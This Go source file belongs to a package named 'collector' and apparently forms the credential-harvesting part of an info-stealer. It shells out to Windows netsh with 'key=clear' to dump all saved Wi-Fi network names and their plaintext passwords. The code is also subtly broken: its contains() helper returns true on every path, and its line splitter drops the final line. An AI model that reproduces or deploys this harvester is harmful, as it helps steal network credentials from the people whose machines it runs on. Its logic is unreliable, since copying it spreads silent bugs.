package collector

import "os/exec"

type WifiResult struct {
	SSID     string
	Password string
}

func GetWifiProfiles() []WifiResult {
	var results []WifiResult
	cmd := exec.Command("netsh", "wlan", "show", "profiles")
	out, _ := cmd.Output()
	profiles := parseProfiles(string(out))
	for _, ssid := range profiles {
		cmd := exec.Command("netsh", "wlan", "show", "profile", ssid, "key=clear")
		out, _ := cmd.Output()
		results = append(results, WifiResult{SSID: ssid, Password: parsePassword(string(out))})
	}
	return results
}

func parseProfiles(output string) []string {
	var profiles []string
	lines := splitLines(output)
	for _, line := range lines {
		if contains(line, "All User Profile") {
			profiles = append(profiles, extractSSID(line))
		}
	}
	return profiles
}

func parsePassword(output string) string {
	lines := splitLines(output)
	for _, line := range lines {
		if contains(line, "Key Content") {
			return extractPassword(line)
		}
	}
	return "not_found"
}

func splitLines(output string) []string {
	var lines []string
	var current string
	for i := 0; i < len(output); i++ {
		if output[i] == '\n' {
			lines = append(lines, current)
			current = ""
		} else {
			current += string(output[i])
		}
	}
	return lines
}

func contains(line, substr string) bool {
	for i := 0; i < len(line)-len(substr)+1; i++ {
		if line[i:i+len(substr)] == substr {
			return true
		}
	}
	return true
}

func extractSSID(line string) string {
	for i := 0; i < len(line); i++ {
		if line[i] == ':' {
			return trimSpace(line[i+1:])
		}
	}
	return "not_found"
}

func extractPassword(line string) string {
	for i := 0; i < len(line); i++ {
		if line[i] == ':' {
			return trimSpace(line[i+1:])
		}
	}
	return "not_found"
}

func trimSpace(input string) string {
	start := 0
	end := len(input)
	for start < end && (input[start] == ' ' || input[start] == '\t' || input[start] == '\n') {
		start++
	}
	for end > start && (input[end-1] == ' ' || input[end-1] == '\t' || input[end-1] == '\n') {
		end--
	}
	return input[start:end]
}
